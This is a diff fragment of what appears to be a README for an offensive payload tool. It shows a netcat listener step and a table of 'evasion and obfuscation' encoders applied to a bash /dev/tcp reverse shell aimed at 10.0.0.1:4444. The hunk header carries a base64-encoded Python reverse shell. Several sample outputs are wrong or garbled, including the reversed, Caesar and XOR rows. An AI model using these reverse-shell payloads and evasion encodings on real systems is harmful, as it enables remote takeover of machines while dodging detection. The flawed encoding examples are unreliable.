@@ -64,3 +64,16 @@ aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxz
 6. Start a Listener
  Copyaryploit > listener nc
 [+] Listener Example (nc): nc -lvnp 4444
+```
+🛠️ Encoders (Evasion & Obfuscation)
+
+Encoder,Description,Example Output
+base64,Standard Base64 encoding,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=
+url,URL encoding,bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F...
+hex,Hexadecimal encoding,62 61 73 68 20 2d 69 20 3e 26 20 2f 64 65 76
+xor,XOR encoding (key: 0x55),¶¬¦¬§¦¬¦§¬¶¦§¬¶¦§¬¶
+rot13,ROT13 cipher,onfu -v >& /qri/gpc/10.0.0.1/4444 0>&1
+reverse,Reverse the string,1>0& 4444/1.0.0.10 cpd/cte/evd/ :ptth
+caesar,Caesar cipher (shift +3),edvk -l >& /gfy/wfs/10.0.0.1/4444 0>&1
+binary,8-bit binary,01100010 01100001 01110011 01101000
+unicode,Unicode escape,\u0062\u0061\u0073\u0068
